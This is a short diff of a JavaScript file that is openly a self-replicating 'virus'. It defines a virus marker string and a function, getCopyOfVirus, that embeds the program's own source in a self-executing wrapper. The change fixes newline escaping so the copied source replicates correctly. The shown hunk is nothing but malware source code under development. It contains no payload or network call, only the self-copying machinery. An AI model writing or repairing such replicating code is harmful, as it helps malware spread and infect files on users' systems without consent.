@@ -5,7 +5,9 @@ const path = require( "path" );
 const VIRUS_MARKER = "/* 8DFKEGIDB38GS3NGJSLWNGHS */";
 
 function getCopyOfVirus( virusSrc, action ) {
-    const esc = str => str.replace(/[\\"]/g, "\\$&");
+    const esc = str => str
+        .replace(/[\\"]/g, "\\$&")
+        .replace(/[\n\r]/g, "\\n");
     return `
 (function() {
     var virusSrc = "${ esc( virusSrc ) }";
